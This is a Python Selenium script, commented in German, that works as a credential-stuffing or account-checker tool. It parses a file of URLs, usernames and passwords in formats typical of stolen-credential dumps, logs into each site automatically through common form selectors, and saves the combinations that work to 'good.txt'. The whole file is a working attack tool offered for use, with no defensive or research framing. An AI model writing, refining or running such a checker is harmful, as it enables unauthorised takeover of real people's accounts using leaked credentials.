from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
from urllib.parse import urlparse
from selenium.common.exceptions import TimeoutException, NoSuchElementException

input_file = "logins.txt"
good_file = "good.txt"
output_file = "output.txt"
successful_identifier = "successful_login_identifier"  # Ersetzen Sie dies durch den tatsächlichen Erfolgsindikator in der Webseite


# Hilfsfunktionen
def ensure_url_scheme(url):
    if not url.startswith(('http://', 'https://')):
        return 'http://' + url
    return url


def is_valid_url(url):
    parsed = urlparse(url)
    return bool(parsed.netloc) and bool(parsed.scheme)


def is_relevant_line(line):
    return any(keyword in line for keyword in ["URL:", "USER:", "Username:", "PASS:", "Password:"])


def is_url_line(line):
    return line.startswith("URL:")


def is_user_line(line):
    return line.startswith("USER:") or line.startswith("Username:")


def is_pass_line(line):
    return line.startswith("PASS:") or line.startswith("Password:")


def log_output(message, file_handle=None):
    trimmed_message = (message[:497] + '...') if len(message) > 500 else message
    print(trimmed_message)  # Print to console
    if file_handle:
        file_handle.write(trimmed_message + '\n')


# Gängige Selektoren definieren
common_selectors = {
    'username': [
        (By.NAME, 'username'), (By.NAME, 'email'), (By.ID, 'username'), (By.ID, 'email'),
        (By.CSS_SELECTOR, 'input[type="email"]'), (By.CSS_SELECTOR, 'input[type="text"]')
    ],
    'password': [
        (By.NAME, 'password'), (By.ID, 'password'), (By.CSS_SELECTOR, 'input[type="password"]')
    ],
    'submit': [
        (By.NAME, 'login'), (By.NAME, 'submit'), (By.ID, 'login'), (By.ID, 'submit'),
        (By.CSS_SELECTOR, 'button[type="submit"]'), (By.XPATH, '//button[text()="Login"]'),
        (By.XPATH, '//button[text()="Sign In"]')
    ]
}


# Funktion zur Erkennung und Eingabe von Benutzernamen, Passwort und Senden des Formulars
def process_login_selenium(driver, url, username, password, output_handle, good_handle):
    url = ensure_url_scheme(url)
    if not is_valid_url(url):
        log_output(f"Ungültige URL: {url}", output_handle)
        return

    try:
        log_output(f"Versuche, zu navigieren: {url}", output_handle)
        try:
            driver.set_page_load_timeout(10)
            driver.get(url)
            log_output(f"Erfolgreich zu {url} navigiert", output_handle)
        except TimeoutException:
            log_output(f"Seitenladezeit für {url} überschritten, fortfahren...", output_handle)
            return

        wait = WebDriverWait(driver, 20)  # Wartezeit von 20 Sekunden

        user_elem, pass_elem, submit_elem = None, None, None

        # Versuche, den Benutzernamen zu finden
        for selector in common_selectors['username']:
            try:
                user_elem = wait.until(EC.presence_of_element_located(selector))
                log_output(f"Benutzername-Feld erkannt mit Selektor: {selector}", output_handle)
                break
            except Exception as e:
                log_output(f"Fehler beim Finden des Benutzernamen-Feldes mit Selektor: {selector}\nGrund: {e}",
                           output_handle)
                continue

        # Versuche, das Passwort zu finden
        for selector in common_selectors['password']:
            if user_elem:
                try:
                    pass_elem = wait.until(EC.presence_of_element_located(selector))
                    log_output(f"Passwort-Feld erkannt mit Selektor: {selector}", output_handle)
                    break
                except Exception as e:
                    log_output(f"Fehler beim Finden des Passwort-Feldes mit Selektor: {selector}\nGrund: {e}",
                               output_handle)
                    continue

        # Versuche, den Login-Button zu finden
        for selector in common_selectors['submit']:
            if pass_elem:
                try:
                    submit_elem = wait.until(EC.element_to_be_clickable(selector))
                    log_output(f"Login-Button erkannt mit Selektor: {selector}", output_handle)
                    break
                except Exception as e:
                    log_output(f"Fehler beim Finden des Login-Buttons mit Selektor: {selector}\nGrund: {e}",
                               output_handle)
                    continue

        if user_elem and pass_elem and submit_elem:
            user_elem.send_keys(username)
            pass_elem.send_keys(password)
            submit_elem.click()
            log_output(f"Login-Button auf {url} geklickt", output_handle)
        else:
            log_output(f"Fehler beim Finden oder Ausfüllen der Login-Elemente auf {url}", output_handle)
            return

        time.sleep(5)  # Warte auf das Laden der Seite

        log_output(f"Überprüfung der Seite nach dem Login-Versuch auf {url}", output_handle)

        # Überprüfen, ob die Anmeldung erfolgreich war
        if successful_identifier in driver.page_source:
            log_output(f"Login erfolgreich für {url}", output_handle)
            if good_handle:
                good_handle.write(f"URL: {url}\nUSER: {username}\nPASS: {password}\n")
        else:
            log_output(f"Login fehlgeschlagen für {url}", output_handle)
    except Exception as e:
        log_output(f"Fehler beim Verarbeiten der URL: {url}\nGrund: {e}", output_handle)


# Startdatum und Zeit
start_time = time.time()

with open(good_file, "w") as good, open(output_file, "w") as output:
    with open(input_file, "r", encoding="ISO-8859-1") as file:
        lines_buffer = []

        # Selenium WebDriver initialisieren (hier using Chrome)
        driver = webdriver.Chrome()  # Solange chromedriver im PATH ist, sollte dies funktionieren

        try:
            for line_num, line in enumerate(file, start=1):
                line = line.strip()
                if not line or not is_relevant_line(line):
                    continue

                if is_url_line(line):
                    lines_buffer = [line]
                elif lines_buffer and is_user_line(line):
                    lines_buffer.append(line)
                elif lines_buffer and len(lines_buffer) == 2 and is_pass_line(line):
                    lines_buffer.append(line)

                if len(lines_buffer) == 3:
                    url = lines_buffer[0].split("URL:")[1].strip()
                    username = lines_buffer[1].split("USER:")[1].strip() if "USER:" in lines_buffer[1] else \
                    lines_buffer[1].split("Username:")[1].strip()
                    password = lines_buffer[2].split("PASS:")[1].strip() if "PASS:" in lines_buffer[2] else \
                    lines_buffer[2].split("Password:")[1].strip()

                    # Debugging-Ausgabe
                    log_output(f"Verarbeite URL: {url} mit Benutzer: {username}", output)
                    process_login_selenium(driver, url, username, password, output, good)
                    lines_buffer.clear()

            # Bearbeiten der Zeilen im Einzeilenformat nach dem Lesen der Datei
            file.seek(0)
            for line_num, line in enumerate(file, start=1):
                line = line.strip()
                if not line:
                    continue

                parts = line.split(' ')
                if len(parts) >= 2 and ":" in parts[1]:
                    url_user_pass = parts[1].split(':')
                    if len(url_user_pass) == 3:
                        url = url_user_pass[0]
                        username = url_user_pass[1]
                        password = url_user_pass[2]
                        process_login_selenium(driver, url, username, password, output, good)

        finally:
            driver.quit()

end_time = time.time()
execution_time = end_time - start_time
print(f"Die Laufzeit des Skripts beträgt {execution_time} Sekunden")

time.sleep(0.1)